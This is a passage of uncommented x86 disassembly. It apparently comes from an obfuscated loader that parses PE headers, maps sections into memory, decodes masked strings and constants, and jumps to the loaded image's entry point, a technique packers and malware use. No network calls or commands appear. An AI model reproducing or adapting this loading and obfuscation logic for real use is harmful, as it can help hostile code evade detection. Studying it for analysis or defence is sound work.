  41ae71:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  41ae78:	mov    eax,DWORD PTR [ebp-0x20]
  41ae7b:	mov    ecx,DWORD PTR [ebp-0x20]
  41ae7e:	xor    eax,ecx
  41ae80:	mov    DWORD PTR [ebp-0x20],eax
  41ae83:	add    DWORD PTR [ebp-0x20],0xf89f05b9
  41ae8a:	mov    eax,0x9471
  41ae8f:	mov    WORD PTR [ebp+0x20],ax
  41ae93:	mov    eax,DWORD PTR [ebp+0x8]
  41ae96:	test   eax,eax
  41ae98:	je     0x41b2f5
  41ae9e:	mov    eax,DWORD PTR [ebp+0xc]
  41aea1:	test   eax,eax
  41aea3:	je     0x41b2f5
  41aea9:	mov    eax,DWORD PTR [ebp+0x18]
  41aeac:	test   eax,eax
  41aeae:	je     0x41b2f5
  41aeb4:	mov    ax,WORD PTR [ebp+0x20]
  41aeb8:	mov    ecx,0x8a8c
  41aebd:	xor    ax,cx
  41aec0:	mov    ecx,0x3b50
  41aec5:	add    ax,cx
  41aec8:	mov    ecx,DWORD PTR [ebp+0x8]
  41aecb:	cmp    WORD PTR [ecx],ax
  41aece:	jne    0x41b2f5
  41aed4:	mov    eax,DWORD PTR [ebp-0x4]
  41aed7:	xor    eax,esi
  41aed9:	add    eax,edi
  41aedb:	mov    DWORD PTR [ebp-0x30],eax
  41aede:	mov    eax,DWORD PTR [ebp-0x4]
  41aee1:	mov    ecx,DWORD PTR [ebp+0x8]
  41aee4:	mov    eax,DWORD PTR [ebp+0x8]
  41aee7:	add    eax,DWORD PTR [ecx+0x3c]
  41aeea:	mov    DWORD PTR [ebp+0xc],eax
  41aeed:	mov    eax,DWORD PTR [eax+0x50]
  41aef0:	test   eax,eax
  41aef2:	je     0x41b2f5
  41aef8:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  41aeff:	mov    eax,DWORD PTR [ebp-0x2c]
  41af02:	xor    eax,esi
  41af04:	add    eax,edi
  41af06:	mov    DWORD PTR [ebp-0x2c],eax
  41af09:	mov    eax,DWORD PTR [ebp-0x4]
  41af0c:	mov    eax,DWORD PTR [ebx+0x190]
  41af12:	mov    ecx,DWORD PTR [eax]
  41af14:	mov    ecx,DWORD PTR [ecx+0x3c]
  41af17:	add    ecx,DWORD PTR [eax]
  41af19:	mov    eax,DWORD PTR [ebp-0x4]
  41af1c:	mov    eax,DWORD PTR [ebx+0x18c]
  41af22:	mov    edx,DWORD PTR [eax]
  41af24:	mov    DWORD PTR [ebp-0x18],ecx
  41af27:	mov    DWORD PTR [ebp+0x20],edx
  41af2a:	cmp    edx,edx
  41af2c:	jne    0x41af61
  41af2e:	mov    eax,DWORD PTR [ebx+0x1d8]
  41af34:	lea    edx,[ebp-0x1c]
  41af37:	push   edx
  41af38:	mov    edx,DWORD PTR [ebp-0xc]
  41af3b:	xor    edx,esi
  41af3d:	add    edx,edi
  41af3f:	push   edx
  41af40:	push   DWORD PTR [ecx+0x50]
  41af43:	push   DWORD PTR [ebp+0x20]
  41af46:	call   DWORD PTR [eax+0x1c]
  41af49:	mov    ecx,DWORD PTR [ebp-0x18]
  41af4c:	mov    eax,DWORD PTR [ecx+0x54]
  41af4f:	mov    ecx,DWORD PTR [ecx+0x50]
  41af52:	sub    ecx,eax
  41af54:	add    eax,DWORD PTR [ebp+0x20]
  41af57:	push   ecx
  41af58:	push   eax
  41af59:	call   0x41b909
  41af5e:	mov    edx,DWORD PTR [ebp+0x20]
  41af61:	mov    eax,DWORD PTR [ebx+0x194]
  41af67:	mov    DWORD PTR [eax],edx
  41af69:	mov    eax,DWORD PTR [ebp+0xc]
  41af6c:	push   DWORD PTR [eax+0x54]
  41af6f:	push   DWORD PTR [ebp+0x8]
  41af72:	push   edx
  41af73:	call   0x41b7b0
  41af78:	mov    ecx,DWORD PTR [ebp+0x20]
  41af7b:	mov    eax,DWORD PTR [ecx+0x3c]
  41af7e:	add    eax,ecx
  41af80:	movzx  ecx,WORD PTR [eax+0x14]
  41af84:	lea    ecx,[ecx+eax*1+0x18]
  41af88:	mov    DWORD PTR [ebp+0x18],ecx
  41af8b:	mov    ecx,DWORD PTR [ebp-0x4]
  41af8e:	movzx  edx,WORD PTR [eax+0x6]
  41af92:	xor    ecx,esi
  41af94:	add    ecx,edi
  41af96:	mov    DWORD PTR [ebp+0xc],eax
  41af99:	cmp    edx,ecx
  41af9b:	je     0x41b049
  41afa1:	mov    ecx,DWORD PTR [ebp-0x4]
  41afa4:	xor    ecx,esi
  41afa6:	add    ecx,edi
  41afa8:	mov    DWORD PTR [ebp-0x8],ecx
  41afab:	mov    ecx,DWORD PTR [ebp-0x24]
  41afae:	movzx  edx,WORD PTR [eax+0x6]
  41afb2:	xor    ecx,esi
  41afb4:	sub    edx,ecx
  41afb6:	sub    edx,edi
  41afb8:	cmp    DWORD PTR [ebp-0x8],edx
  41afbb:	ja     0x41b049
  41afc1:	mov    edx,DWORD PTR [ebp+0x18]
  41afc4:	add    edx,0x8
  41afc7:	mov    DWORD PTR [ebp+0x18],edx
  41afca:	jmp    0x41afcf
  41afcc:	mov    edx,DWORD PTR [ebp+0x18]
  41afcf:	mov    eax,DWORD PTR [eax+0x38]
  41afd2:	lea    ecx,[eax-0x1]
  41afd5:	mov    DWORD PTR [ebp-0x34],eax
  41afd8:	mov    eax,DWORD PTR [edx]
  41afda:	test   ecx,eax
  41afdc:	je     0x41afe5
  41afde:	not    ecx
  41afe0:	and    eax,ecx
  41afe2:	add    eax,DWORD PTR [ebp-0x34]
  41afe5:	push   eax
  41afe6:	mov    eax,DWORD PTR [edx+0x4]
  41afe9:	add    eax,DWORD PTR [ebp+0x20]
  41afec:	push   eax
  41afed:	call   0x41b909
  41aff2:	mov    edx,DWORD PTR [ebp-0x4]
  41aff5:	mov    eax,DWORD PTR [ebp+0x18]
  41aff8:	mov    ecx,DWORD PTR [eax+0x8]
  41affb:	xor    edx,esi
  41affd:	add    edx,edi
  41afff:	cmp    ecx,edx
  41b001:	je     0x41b01a
  41b003:	push   ecx
  41b004:	mov    ecx,DWORD PTR [ebp+0x8]
  41b007:	add    ecx,DWORD PTR [eax+0xc]
  41b00a:	mov    eax,DWORD PTR [eax+0x4]
  41b00d:	add    eax,DWORD PTR [ebp+0x20]
  41b010:	push   ecx
  41b011:	push   eax
  41b012:	call   0x41b7b0
  41b017:	mov    eax,DWORD PTR [ebp+0x18]
  41b01a:	mov    ecx,DWORD PTR [ebp-0x24]
  41b01d:	mov    edx,DWORD PTR [ebp-0x8]
  41b020:	add    eax,0x28
  41b023:	xor    ecx,esi
  41b025:	lea    ecx,[edx+ecx*1+0x3272e0]
  41b02c:	mov    edx,DWORD PTR [ebp+0xc]
  41b02f:	mov    DWORD PTR [ebp+0x18],eax
  41b032:	mov    eax,DWORD PTR [ebp-0x24]
  41b035:	movzx  edx,WORD PTR [edx+0x6]
  41b039:	xor    eax,esi
  41b03b:	sub    edx,eax
  41b03d:	mov    eax,DWORD PTR [ebp+0xc]
  41b040:	sub    edx,edi
  41b042:	mov    DWORD PTR [ebp-0x8],ecx
  41b045:	cmp    ecx,edx
  41b047:	jbe    0x41afcc
  41b049:	mov    edx,DWORD PTR [ebx+0x18c]
  41b04f:	mov    ecx,DWORD PTR [ebp+0x20]
  41b052:	cmp    ecx,DWORD PTR [edx]
  41b054:	jne    0x41b07d
  41b056:	mov    eax,DWORD PTR [ebx+0x1d8]
  41b05c:	lea    edx,[ebp-0x1c]
  41b05f:	push   edx
  41b060:	mov    edx,DWORD PTR [ebp-0x10]
  41b063:	xor    edx,esi
  41b065:	add    edx,edi
  41b067:	push   edx
  41b068:	mov    edx,DWORD PTR [ebp-0x18]
  41b06b:	push   DWORD PTR [edx+0x54]
  41b06e:	push   ecx
  41b06f:	call   DWORD PTR [eax+0x1c]
  41b072:	test   eax,eax
  41b074:	je     0x41b2e6
  41b07a:	mov    eax,DWORD PTR [ebp+0xc]
  41b07d:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41b083:	mov    ecx,DWORD PTR [ecx]
  41b085:	xor    ecx,esi
  41b087:	add    ecx,edi
  41b089:	je     0x41b211
  41b08f:	and    DWORD PTR [ebp-0x28],0x0
  41b093:	and    DWORD PTR [ebp+0x8],0x0
  41b097:	mov    eax,0xf89c851d
  41b09c:	lea    ecx,[eax-0x8]
  41b09f:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41b0a6:	mov    DWORD PTR [ebp-0x48],0xf89c850d
  41b0ad:	mov    DWORD PTR [ebp-0x44],eax
  41b0b0:	mov    DWORD PTR [ebp-0x40],ecx
  41b0b3:	mov    DWORD PTR [ebp-0x3c],ecx
  41b0b6:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41b0bd:	mov    edx,DWORD PTR [ebp+0x8]
  41b0c0:	mov    ecx,0x899
  41b0c5:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41b0ca:	mov    edx,0x72e0
  41b0cf:	add    cx,dx
  41b0d2:	mov    edx,DWORD PTR [ebp+0x8]
  41b0d5:	inc    DWORD PTR [ebp+0x8]
  41b0d8:	cmp    DWORD PTR [ebp+0x8],0x6
  41b0dc:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41b0e4:	jb     0x41b0bd
  41b0e6:	mov    ecx,0xf89c850b
  41b0eb:	mov    DWORD PTR [ebp-0xa4],eax
  41b0f1:	mov    DWORD PTR [ebp-0x90],eax
  41b0f7:	mov    DWORD PTR [ebp-0x68],eax
  41b0fa:	mov    DWORD PTR [ebp-0x64],eax
  41b0fd:	lea    eax,[ecx-0x1]
  41b100:	mov    edx,0xf89c85ff
  41b105:	mov    DWORD PTR [ebp-0x58],eax
  41b108:	mov    DWORD PTR [ebp-0x54],eax
  41b10b:	mov    DWORD PTR [ebp-0xa8],0xf89c85f5
  41b115:	mov    DWORD PTR [ebp-0xa0],ecx
  41b11b:	mov    DWORD PTR [ebp-0x9c],edx
  41b121:	mov    DWORD PTR [ebp-0x98],0xf89c8510
  41b12b:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41b135:	mov    DWORD PTR [ebp-0x8c],0xf89c85fc
  41b13f:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41b149:	mov    DWORD PTR [ebp-0x84],0xf89c850d
  41b153:	mov    DWORD PTR [ebp-0x80],ecx
  41b156:	mov    DWORD PTR [ebp-0x7c],0xf89c8500
  41b15d:	mov    DWORD PTR [ebp-0x78],edx
  41b160:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41b167:	mov    DWORD PTR [ebp-0x70],ecx
  41b16a:	mov    DWORD PTR [ebp-0x6c],0xf89c85f8
  41b171:	mov    DWORD PTR [ebp-0x60],ecx
  41b174:	mov    DWORD PTR [ebp-0x5c],0xf89c851c
  41b17b:	mov    DWORD PTR [ebp-0x50],0xf89c85b9
  41b182:	xor    eax,eax
  41b184:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41b18b:	xor    cl,0x99
  41b18e:	sub    cl,0x20
  41b191:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41b198:	inc    eax
  41b199:	cmp    eax,0x17
  41b19c:	jb     0x41b184
  41b19e:	mov    eax,DWORD PTR [ebx+0x1d8]
  41b1a4:	lea    ecx,[ebp-0xb4]
  41b1aa:	push   ecx
  41b1ab:	call   DWORD PTR [eax+0x4]
  41b1ae:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41b1b4:	lea    edx,[ebp-0xcc]
  41b1ba:	push   edx
  41b1bb:	push   eax
  41b1bc:	call   DWORD PTR [ecx+0x8]
  41b1bf:	lea    ecx,[ebp-0x28]
  41b1c2:	push   ecx
  41b1c3:	mov    ecx,DWORD PTR [ebx+0x18c]
  41b1c9:	push   DWORD PTR [ecx]
  41b1cb:	call   eax
  41b1cd:	mov    eax,DWORD PTR [ebp-0x28]
  41b1d0:	test   eax,eax
  41b1d2:	je     0x41b20e
  41b1d4:	mov    DWORD PTR [ebp+0x8],eax
  41b1d7:	jmp    0x41b1e3
  41b1d9:	mov    eax,DWORD PTR [eax]
  41b1db:	mov    DWORD PTR [ebp-0x28],eax
  41b1de:	cmp    eax,DWORD PTR [ebp+0x8]
  41b1e1:	je     0x41b1f0
  41b1e3:	mov    edx,DWORD PTR [eax+0x18]
  41b1e6:	mov    ecx,DWORD PTR [ebx+0x18c]
  41b1ec:	cmp    edx,DWORD PTR [ecx]
  41b1ee:	jne    0x41b1d9
  41b1f0:	mov    edx,DWORD PTR [eax+0x18]
  41b1f3:	mov    ecx,DWORD PTR [ebx+0x18c]
  41b1f9:	cmp    edx,DWORD PTR [ecx]
  41b1fb:	jne    0x41b20e
  41b1fd:	mov    edx,DWORD PTR [ebp-0x18]
  41b200:	mov    ecx,DWORD PTR [ebx+0x190]
  41b206:	mov    edx,DWORD PTR [edx+0x28]
  41b209:	add    edx,DWORD PTR [ecx]
  41b20b:	mov    DWORD PTR [eax+0x1c],edx
  41b20e:	mov    eax,DWORD PTR [ebp+0xc]
  41b211:	push   ebx
  41b212:	push   eax
  41b213:	push   DWORD PTR [ebp+0x20]
  41b216:	call   0x41a9be
  41b21b:	test   eax,eax
  41b21d:	je     0x41b2e6
  41b223:	push   DWORD PTR [ebp+0xc]
  41b226:	mov    ecx,ebx
  41b228:	push   DWORD PTR [ebp+0x20]
  41b22b:	call   0x41a917
  41b230:	test   eax,eax
  41b232:	je     0x41b2e6
  41b238:	mov    eax,DWORD PTR [ebp+0xc]
  41b23b:	mov    edx,DWORD PTR [ebp+0x20]
  41b23e:	mov    ecx,ebx
  41b240:	call   0x41a7f0
  41b245:	test   eax,eax
  41b247:	je     0x41b2e6
  41b24d:	push   ebx
  41b24e:	push   DWORD PTR [ebp+0x20]
  41b251:	call   0x41aca1
  41b256:	test   eax,eax
  41b258:	je     0x41b2e6
  41b25e:	mov    eax,DWORD PTR [ebx+0x18c]
  41b264:	mov    edx,DWORD PTR [ebp+0x20]
  41b267:	cmp    edx,DWORD PTR [eax]
  41b269:	jne    0x41b285
  41b26b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41b271:	lea    ecx,[ebp-0x1c]
  41b274:	push   ecx
  41b275:	push   DWORD PTR [ebp-0x1c]
  41b278:	mov    ecx,DWORD PTR [ebp-0x18]
  41b27b:	push   DWORD PTR [ecx+0x54]
  41b27e:	push   edx
  41b27f:	call   DWORD PTR [eax+0x1c]
  41b282:	mov    edx,DWORD PTR [ebp+0x20]
  41b285:	mov    eax,DWORD PTR [ebx+0x1c8]
  41b28b:	mov    eax,DWORD PTR [eax]
  41b28d:	xor    eax,esi
  41b28f:	add    eax,edi
  41b291:	je     0x41b2ca
  41b293:	mov    ecx,DWORD PTR [ebp+0xc]
  41b296:	mov    eax,DWORD PTR [ecx+0x28]
  41b299:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  41b2a0:	mov    esi,DWORD PTR [ebp+0x8]
  41b2a3:	push   DWORD PTR [ebp+0x14]
  41b2a6:	xor    esi,0x899
  41b2ac:	push   DWORD PTR [ebp+0x10]
  41b2af:	add    esi,0x72e0
  41b2b5:	or     WORD PTR [ecx+0x16],si
  41b2b9:	add    eax,edx
  41b2bb:	push   edx
  41b2bc:	call   eax
  41b2be:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  41b2c8:	jmp    0x41b2d4
  41b2ca:	mov    eax,DWORD PTR [ebp+0xc]
  41b2cd:	mov    eax,DWORD PTR [eax+0x28]
  41b2d0:	add    eax,edx
  41b2d2:	call   eax
  41b2d4:	mov    DWORD PTR [ebp-0x8],eax
  41b2d7:	mov    eax,DWORD PTR [ebp-0x8]
  41b2da:	mov    ecx,DWORD PTR [ebp+0x1c]
  41b2dd:	mov    DWORD PTR [ecx],eax
  41b2df:	mov    DWORD PTR [ebp-0x30],0x1
  41b2e6:	cmp    DWORD PTR [ebp-0x30],0x0
  41b2ea:	jne    0x41b2f0
  41b2ec:	and    DWORD PTR [ebp+0x20],0x0
  41b2f0:	mov    eax,DWORD PTR [ebp+0x20]
  41b2f3:	jmp    0x41b2f7
  41b2f5:	xor    eax,eax
  41b2f7:	pop    edi
  41b2f8:	pop    esi
  41b2f9:	pop    ebx
  41b2fa:	leave  
  41b2fb:	ret    0x1c
  41b2fe:	push   ebp
  41b2ff:	mov    ebp,esp
  41b301:	movzx  edx,WORD PTR [ecx+0x6]
  41b305:	movzx  eax,WORD PTR [ecx+0x14]
  41b309:	push   ebx
  41b30a:	push   edi
  41b30b:	xor    edi,edi
  41b30d:	lea    eax,[eax+ecx*1+0x18]
  41b311:	test   edx,edx
  41b313:	je     0x41b334
  41b315:	mov    ecx,DWORD PTR [eax+0xc]
  41b318:	lea    ebx,[ecx+esi*1]
  41b31b:	cmp    DWORD PTR [ebp+0x8],ebx
  41b31e:	jb     0x41b32c
  41b320:	mov    ebx,DWORD PTR [eax+0x8]
  41b323:	add    ebx,ecx
  41b325:	add    ebx,esi
  41b327:	cmp    DWORD PTR [ebp+0x8],ebx
  41b32a:	jb     0x41b336
  41b32c:	add    eax,0x28
  41b32f:	inc    edi
  41b330:	cmp    edi,edx
  41b332:	jb     0x41b315
  41b334:	xor    eax,eax
  41b336:	pop    edi
  41b337:	pop    ebx
  41b338:	pop    ebp
  41b339:	ret    0x4
  41b33c:	push   ebp
  41b33d:	mov    ebp,esp
  41b33f:	sub    esp,0x28
  41b342:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  41b349:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41b350:	mov    DWORD PTR [ebp-0x28],0xf89c85bb
  41b357:	mov    eax,0x4f9d
  41b35c:	mov    WORD PTR [ebp-0xc],ax
  41b360:	mov    eax,0x4e7d
  41b365:	mov    WORD PTR [ebp-0x4],ax
  41b369:	mov    eax,0x4fa6
  41b36e:	mov    WORD PTR [ebp-0x8],ax
  41b372:	add    eax,0xffffffe0
  41b375:	mov    WORD PTR [ebp-0x8],ax
  41b379:	mov    eax,DWORD PTR [ebp+0x8]
  41b37c:	mov    DWORD PTR [ebp-0x14],eax
  41b37f:	mov    eax,DWORD PTR [ebp+0xc]
  41b382:	mov    DWORD PTR [ebp-0x18],eax
  41b385:	mov    eax,DWORD PTR [ebp-0x10]
  41b388:	push   ebx
  41b389:	mov    ecx,0x7510899
  41b38e:	xor    eax,ecx
  41b390:	push   esi
  41b391:	mov    esi,DWORD PTR [ebp-0x14]
  41b394:	mov    edx,0x3272e0
  41b399:	add    eax,edx
  41b39b:	push   edi
  41b39c:	cmp    esi,eax
  41b39e:	je     0x41b59c
  41b3a4:	mov    eax,DWORD PTR [ebp-0x10]
  41b3a7:	mov    esi,DWORD PTR [ebp-0x18]
  41b3aa:	xor    eax,ecx
  41b3ac:	add    eax,edx
  41b3ae:	cmp    esi,eax
  41b3b0:	je     0x41b59c
  41b3b6:	mov    eax,DWORD PTR [ebp-0x10]
  41b3b9:	xor    eax,ecx
  41b3bb:	add    eax,edx
  41b3bd:	mov    DWORD PTR [ebp-0x20],eax
  41b3c0:	mov    eax,DWORD PTR [ebp-0x10]
  41b3c3:	xor    eax,ecx
  41b3c5:	add    eax,edx
  41b3c7:	mov    DWORD PTR [ebp-0x24],eax
  41b3ca:	movzx  esi,WORD PTR [ebp-0x4]
  41b3ce:	movzx  edi,WORD PTR [ebp-0xc]
  41b3d2:	mov    eax,0x8a8c
  41b3d7:	xor    si,ax
  41b3da:	mov    ebx,0x8a8c
  41b3df:	xor    di,bx
  41b3e2:	mov    eax,0x3b50
  41b3e7:	add    si,ax
  41b3ea:	add    di,ax
  41b3ed:	sub    edi,esi
  41b3ef:	mov    WORD PTR [ebp-0xc],di
  41b3f3:	mov    esi,DWORD PTR [ebp-0x20]
  41b3f6:	mov    edi,DWORD PTR [ebp-0x14]
  41b3f9:	mov    si,WORD PTR [edi+esi*2]
  41b3fd:	mov    WORD PTR [ebp+0x8],si
  41b401:	mov    esi,DWORD PTR [ebp-0x24]
  41b404:	mov    edi,DWORD PTR [ebp-0x18]
  41b407:	mov    si,WORD PTR [edi+esi*2]
  41b40b:	mov    WORD PTR [ebp+0xc],si
  41b40f:	mov    esi,0x72e0
  41b414:	jmp    0x41b521
  41b419:	mov    edi,DWORD PTR [ebp-0x10]
  41b41c:	mov    bx,WORD PTR [ebp+0xc]
  41b420:	xor    edi,0x899
  41b426:	add    edi,esi
  41b428:	cmp    bx,di
  41b42b:	je     0x41b54b
  41b431:	mov    edi,DWORD PTR [ebp-0x10]
  41b434:	mov    ebx,DWORD PTR [ebp+0x10]
  41b437:	xor    edi,ecx
  41b439:	add    edi,edx
  41b43b:	cmp    ebx,edi
  41b43d:	mov    di,WORD PTR [ebp+0xc]
  41b441:	mov    bx,WORD PTR [ebp+0x8]
  41b445:	je     0x41b4d8
  41b44b:	cmp    bx,di
  41b44e:	je     0x41b4e1
  41b454:	mov    di,WORD PTR [ebp-0x4]
  41b458:	mov    ebx,0x8a8c
  41b45d:	xor    di,bx
  41b460:	mov    bx,WORD PTR [ebp+0x8]
  41b464:	add    di,ax
  41b467:	cmp    bx,di
  41b46a:	jb     0x41b492
  41b46c:	mov    di,WORD PTR [ebp-0x8]
  41b470:	mov    ebx,0x8a8c
  41b475:	xor    di,bx
  41b478:	mov    bx,WORD PTR [ebp+0x8]
  41b47c:	add    di,ax
  41b47f:	cmp    bx,di
  41b482:	ja     0x41b492
  41b484:	movzx  edi,WORD PTR [ebp+0x8]
  41b488:	movzx  ebx,WORD PTR [ebp-0xc]
  41b48c:	add    edi,ebx
  41b48e:	mov    WORD PTR [ebp+0x8],di
  41b492:	mov    di,WORD PTR [ebp-0x4]
  41b496:	mov    ebx,0x8a8c
  41b49b:	xor    di,bx
  41b49e:	mov    bx,WORD PTR [ebp+0xc]
  41b4a2:	add    di,ax
  41b4a5:	cmp    bx,di
  41b4a8:	jb     0x41b4d0
  41b4aa:	mov    di,WORD PTR [ebp-0x8]
  41b4ae:	mov    ebx,0x8a8c
  41b4b3:	xor    di,bx
  41b4b6:	mov    bx,WORD PTR [ebp+0xc]
  41b4ba:	add    di,ax
  41b4bd:	cmp    bx,di
  41b4c0:	ja     0x41b4d0
  41b4c2:	movzx  edi,WORD PTR [ebp+0xc]
  41b4c6:	movzx  ebx,WORD PTR [ebp-0xc]
  41b4ca:	add    edi,ebx
  41b4cc:	mov    WORD PTR [ebp+0xc],di
  41b4d0:	mov    di,WORD PTR [ebp+0xc]
  41b4d4:	mov    bx,WORD PTR [ebp+0x8]
  41b4d8:	cmp    bx,di
  41b4db:	jne    0x41b59c
  41b4e1:	mov    edi,DWORD PTR [ebp-0x28]
  41b4e4:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4e7:	xor    edi,ecx
  41b4e9:	lea    edi,[edi+ebx*1+0x3272e0]
  41b4f0:	mov    DWORD PTR [ebp-0x14],edi
  41b4f3:	mov    edi,DWORD PTR [ebp-0x28]
  41b4f6:	mov    ebx,DWORD PTR [ebp-0x18]
  41b4f9:	xor    edi,ecx
  41b4fb:	lea    edi,[edi+ebx*1+0x3272e0]
  41b502:	mov    DWORD PTR [ebp-0x18],edi
  41b505:	mov    edi,DWORD PTR [ebp-0x20]
  41b508:	mov    ebx,DWORD PTR [ebp-0x14]
  41b50b:	mov    di,WORD PTR [ebx+edi*2]
  41b50f:	mov    WORD PTR [ebp+0x8],di
  41b513:	mov    edi,DWORD PTR [ebp-0x24]
  41b516:	mov    ebx,DWORD PTR [ebp-0x18]
  41b519:	mov    di,WORD PTR [ebx+edi*2]
  41b51d:	mov    WORD PTR [ebp+0xc],di
  41b521:	mov    edi,DWORD PTR [ebp-0x10]
  41b524:	mov    bx,WORD PTR [ebp+0x8]
  41b528:	xor    edi,0x899
  41b52e:	add    edi,esi
  41b530:	cmp    bx,di
  41b533:	jne    0x41b419
  41b539:	mov    esi,DWORD PTR [ebp-0x1c]
  41b53c:	xor    esi,ecx
  41b53e:	mov    ecx,DWORD PTR [ebp-0x10]
  41b541:	add    esi,edx
  41b543:	imul   esi,ecx
  41b546:	mov    DWORD PTR [ebp-0x10],esi
  41b549:	jmp    0x41b55d
  41b54b:	mov    edx,DWORD PTR [ebp-0x10]
  41b54e:	xor    edx,ecx
  41b550:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b553:	lea    ecx,[edx+ecx*1+0x3272e0]
  41b55a:	mov    DWORD PTR [ebp-0x1c],ecx
  41b55d:	mov    edx,DWORD PTR [ebp-0x20]
  41b560:	mov    esi,DWORD PTR [ebp-0x14]
  41b563:	mov    si,WORD PTR [esi+edx*2]
  41b567:	mov    ecx,eax
  41b569:	sub    si,cx
  41b56c:	mov    edx,0x8a8c
  41b571:	xor    si,dx
  41b574:	mov    ecx,0x4e3c
  41b579:	cmp    si,cx
  41b57c:	jne    0x41b597
  41b57e:	mov    esi,DWORD PTR [ebp-0x24]
  41b581:	mov    edi,DWORD PTR [ebp-0x18]
  41b584:	mov    si,WORD PTR [edi+esi*2]
  41b588:	sub    si,ax
  41b58b:	xor    si,dx
  41b58e:	cmp    si,cx
  41b591:	jne    0x41b597
  41b593:	xor    eax,eax
  41b595:	jmp    0x41b5a3
  41b597:	xor    eax,eax
  41b599:	inc    eax
  41b59a:	jmp    0x41b5a3
  41b59c:	mov    eax,DWORD PTR [ebp-0x1c]
  41b59f:	xor    eax,ecx
  41b5a1:	add    eax,edx
  41b5a3:	pop    edi
  41b5a4:	pop    esi
  41b5a5:	pop    ebx
  41b5a6:	leave  
  41b5a7:	ret    0xc
  41b5aa:	push   ebp
  41b5ab:	mov    ebp,esp
  41b5ad:	push   ecx
  41b5ae:	mov    cx,WORD PTR [eax]
  41b5b1:	push   esi
  41b5b2:	mov    esi,0x3b50
  41b5b7:	sub    cx,si
  41b5ba:	mov    esi,0x8a8c
  41b5bf:	xor    cx,si
  41b5c2:	mov    esi,0x4e3c
  41b5c7:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41b5ce:	mov    edx,0xf89c85b9
  41b5d3:	cmp    cx,si
  41b5d6:	je     0x41b635
  41b5d8:	push   ebx
  41b5d9:	push   edi
  41b5da:	movzx  ecx,cx
  41b5dd:	mov    edi,0xffcd8d20
  41b5e2:	mov    esi,0x7510899
  41b5e7:	mov    ebx,0x4f80
  41b5ec:	cmp    cx,bx
  41b5ef:	jne    0x41b5f4
  41b5f1:	mov    DWORD PTR [ebp-0x4],edx
  41b5f4:	lea    edx,[edi+0x1]
  41b5f7:	xor    edx,esi
  41b5f9:	mov    edi,edx
  41b5fb:	xor    edi,esi
  41b5fd:	mov    cx,WORD PTR [eax+edi*2+0x64e5c0]
  41b605:	mov    ebx,0x3b50
  41b60a:	sub    cx,bx
  41b60d:	mov    ebx,0x8a8c
  41b612:	xor    cx,bx
  41b615:	mov    ebx,0x4e3c
  41b61a:	cmp    cx,bx
  41b61d:	jne    0x41b5e7
  41b61f:	mov    ecx,DWORD PTR [ebp-0x4]
  41b622:	pop    edi
  41b623:	pop    ebx
  41b624:	cmp    ecx,0xf89c8586
  41b62a:	je     0x41b635
  41b62c:	xor    ecx,esi
  41b62e:	lea    eax,[eax+ecx*2+0x64e5c2]
  41b635:	pop    esi
  41b636:	leave  
  41b637:	ret    
  41b638:	push   ebp
  41b639:	mov    ebp,esp
  41b63b:	push   ecx
  41b63c:	push   esi
  41b63d:	push   edi
  41b63e:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41b645:	mov    esi,0xf89c85b9
  41b64a:	call   0x41b5aa
  41b64f:	mov    edi,eax
  41b651:	mov    al,BYTE PTR [edi]
  41b653:	add    al,0x9
  41b655:	xor    al,0x73
  41b657:	cmp    al,0x7a
  41b659:	je     0x41b6bc
  41b65b:	mov    eax,edi
  41b65d:	mov    edx,0xffcd8d20
  41b662:	mov    ecx,0x7510899
  41b667:	push   ebx
  41b668:	mov    ax,WORD PTR [eax]
  41b66b:	mov    ebx,0x3b50
  41b670:	sub    ax,bx
  41b673:	mov    ebx,0x8a8c
  41b678:	xor    ax,bx
  41b67b:	mov    ebx,0x4e52
  41b680:	cmp    ax,bx
  41b683:	jne    0x41b688
  41b685:	mov    DWORD PTR [ebp-0x4],esi
  41b688:	lea    esi,[edx+0x1]
  41b68b:	xor    esi,ecx
  41b68d:	mov    edx,esi
  41b68f:	xor    edx,ecx
  41b691:	lea    eax,[edi+edx*2+0x64e5c0]
  41b698:	mov    bl,BYTE PTR [eax]
  41b69a:	add    bl,0x9
  41b69d:	xor    bl,0x73
  41b6a0:	cmp    bl,0x7a
  41b6a3:	jne    0x41b668
  41b6a5:	mov    eax,DWORD PTR [ebp-0x4]
  41b6a8:	pop    ebx
  41b6a9:	cmp    eax,0xf89c8586
  41b6ae:	je     0x41b6bc
  41b6b0:	xor    eax,ecx
  41b6b2:	xor    ecx,ecx
  41b6b4:	mov    WORD PTR [edi+eax*2+0x64e5c0],cx
  41b6bc:	mov    eax,edi
  41b6be:	pop    edi
  41b6bf:	pop    esi
  41b6c0:	leave  
  41b6c1:	ret    
  41b6c2:	push   ebp
  41b6c3:	mov    ebp,esp
  41b6c5:	push   ecx
  41b6c6:	push   esi
  41b6c7:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41b6ce:	mov    esi,0xf89c85b9
  41b6d3:	call   0x41b5aa
  41b6d8:	mov    cx,WORD PTR [eax]
  41b6db:	mov    edx,0x3b50
  41b6e0:	sub    cx,dx
  41b6e3:	mov    edx,0x8a8c
  41b6e8:	xor    cx,dx
  41b6eb:	mov    edx,0x4e3c
  41b6f0:	cmp    cx,dx
  41b6f3:	je     0x41b74c
  41b6f5:	push   ebx
  41b6f6:	push   edi
  41b6f7:	movzx  ecx,cx
  41b6fa:	mov    edx,0xffcd8d20
  41b6ff:	mov    edi,0x7510899
  41b704:	mov    ebx,0x4e52
